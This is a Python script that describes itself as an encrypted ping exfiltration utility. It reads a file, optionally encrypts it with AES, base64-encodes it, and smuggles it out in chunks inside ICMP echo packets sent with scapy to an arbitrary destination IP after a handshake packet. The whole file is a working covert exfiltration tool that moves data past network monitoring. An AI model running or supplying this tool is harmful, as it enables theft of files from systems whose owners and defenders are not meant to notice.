#!/usr/bin/python3

import scapy.all as scapy
from os import getuid
import random
import base64
from time import sleep
from hashlib import sha256
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Util.Padding import pad
import argparse

SLEEP_TIME = 2
HANDSHAKE_MSG = b"wei wei"
DATA_SIZE_LEN = 4



def read_file(filename):
    with open(filename, 'rb') as f:
        s = f.read()
    return s

def b64_encode(raw_data):
    return str(base64.b64encode(raw_data), "utf-8")

def divide_data(data, max_size):
    a = []
    # separate first parts
    while(len(data) > max_size):
        a.append(data[:max_size])
        data = data[max_size:]
    # append the last part
    a.append(data.ljust(max_size, '\x00'))
    return a

def encrypt(raw, password):
    # if no password, no encryption
    if password == '':
        return file_content
    
    #unpad = lambda s: s[:-ord(s[len(s) - 1:])]
    key = sha256(password.encode("utf-8")).digest()
    raw = pad(raw, 16, style='pkcs7')
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(raw)

def handshake(dst, data_len):
    id = random.randint(0, 65526-1)
    seq_n = random.randint(0, 65526-1)

    data_entry = HANDSHAKE_MSG + data_len.to_bytes(4, byteorder='big')
    packet = scapy.IP(dst=dst)/scapy.ICMP(id=id, seq=seq_n)/data_entry
    res = scapy.send(packet)
    
    return (id, (seq_n + 1) % 65526 )


def send_data(dst, id, seq_n, data_array):
    for data_entry in data_array:
        packet = scapy.IP(dst=dst)/scapy.ICMP(id=id, seq=seq_n)/data_entry
        scapy.send(packet)
        seq_n = (seq_n + 1) % 65526

def parse_arguments():
    parser = argparse.ArgumentParser(description="an encrypted ping exfiltration utility",prog="pingthefuckoutSender",)
    parser.add_argument("-i","--in",type=str,dest="in_file",required=True,help="file to be transfered",)
    parser.add_argument("-s","--size",type=int,dest="packet_size",default=64,help="dimension of the ping packets size",)
    parser.add_argument("-p","--password",type=str,dest="password",default="",help="password used for encryption" )
    parser.add_argument("destination_ip", help="destination host ip address")
    return parser.parse_args()

if __name__ == "__main__":
    if getuid() != 0:
        print("Please run as root user")
        exit(1)
    args = parse_arguments()
    file_content = read_file(args.in_file)
    encrypted_data = encrypt(file_content, args.password)
    b64_data = b64_encode(encrypted_data)
    data_array = divide_data(b64_data, args.packet_size)
    id, seq_n = handshake(args.destination_ip, len(data_array))
    sleep(SLEEP_TIME)
    send_data(args.destination_ip, id, seq_n, data_array)



